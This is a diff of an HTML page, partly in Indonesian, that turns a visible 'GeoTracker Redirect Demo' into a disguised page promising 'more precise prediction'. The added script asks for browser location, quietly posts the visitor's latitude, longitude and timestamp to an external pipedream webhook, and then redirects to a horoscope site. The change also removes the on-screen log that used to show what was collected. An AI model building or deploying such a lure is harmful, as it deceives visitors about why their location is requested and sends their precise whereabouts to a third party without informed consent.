@@ -1,72 +1,62 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>GeoTracker Redirect</title>
+  <title>Allow Location Access for More Precise Prediction</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f9f9f9;
+    }
+    #status {
+      font-size: 1.4em;
+      color: #333;
+    }
+  </style>
 </head>
 <body>
-  <h1>GeoTracker Redirect Demo</h1>
-  <p id="status">📍 Meminta akses lokasi...</p>
-  <pre id="log" style="background:#f4f4f4; padding:10px; border:1px solid #ccc;"></pre>
+  <div id="status">Mengakses lokasi...</div>
 
   <script>
+    const webhookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
+    const redirectTo = "https://www.astro.com/horoscope";
     const statusEl = document.getElementById("status");
-    const logEl = document.getElementById("log");
 
-    function log(message) {
-      console.log(message);
-      logEl.textContent += message + "\n";
-    }
-
-    function redirectToAstro() {
-      log("🔁 Mengarahkan ke astro.com...");
-      window.location.href = "https://www.astro.com/horoscope";
+    function redirect() {
+      window.location.href = redirectTo;
     }
 
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
-        function (position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          const timestamp = new Date().toISOString();
+        (position) => {
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            timestamp: new Date().toISOString()
+          };
 
-          statusEl.textContent = `✅ Lokasi ditemukan`;
-          log(`Latitude: ${latitude}`);
-          log(`Longitude: ${longitude}`);
-          log(`Timestamp: ${timestamp}`);
-
-          fetch("https://eo4zwpbukao2mkl.m.pipedream.net/", {
+          fetch(webhookURL, {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
             },
-            body: JSON.stringify({
-              latitude,
-              longitude,
-              timestamp
-            })
+            body: JSON.stringify(data)
           })
-          .then(response => {
-            log(`✅ Data dikirim. Status: ${response.status}`);
-            // Redirect setelah berhasil
-            setTimeout(redirectToAstro, 1000);
-          })
-          .catch(error => {
-            log(`❌ Gagal kirim data: ${error}`);
-            // Tetap redirect meski gagal
-            setTimeout(redirectToAstro, 2000);
+          .finally(() => {
+            setTimeout(redirect, 1000);
           });
         },
-        function (error) {
-          statusEl.textContent = "❌ Gagal mendapatkan lokasi.";
-          log("Geolocation error: " + error.message);
-          setTimeout(redirectToAstro, 2000);
+        (error) => {
+          setTimeout(redirect, 2000);
         }
       );
     } else {
-      statusEl.textContent = "❌ Browser tidak mendukung geolocation.";
-      log("Geolocation tidak tersedia.");
-      setTimeout(redirectToAstro, 2000);
+      setTimeout(redirect, 2000);
     }
   </script>
 </body>
